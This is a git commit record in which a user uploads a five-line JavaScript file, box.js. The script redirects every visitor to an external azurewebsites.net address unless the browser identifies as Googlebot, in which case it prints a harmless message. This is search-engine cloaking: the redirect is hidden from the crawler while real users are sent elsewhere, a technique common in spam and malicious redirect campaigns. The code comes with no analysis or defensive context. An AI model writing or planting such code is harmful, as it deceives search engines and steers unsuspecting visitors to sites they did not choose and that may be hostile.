b4624fde229df2d19d8c6b1d4d5d6d735d5e1895
khannn12 <toufikalahekhan@gmail.com>
2026-09-23 04:23:09 +0600

    Add files via upload

---
+++ box.js
@@ -0,0 +1,5 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  window.location.href = "https://chudmagiold.azurewebsites.net/vod/";
+} else {
+  console.log("Thanks for visiting my page" );
+}
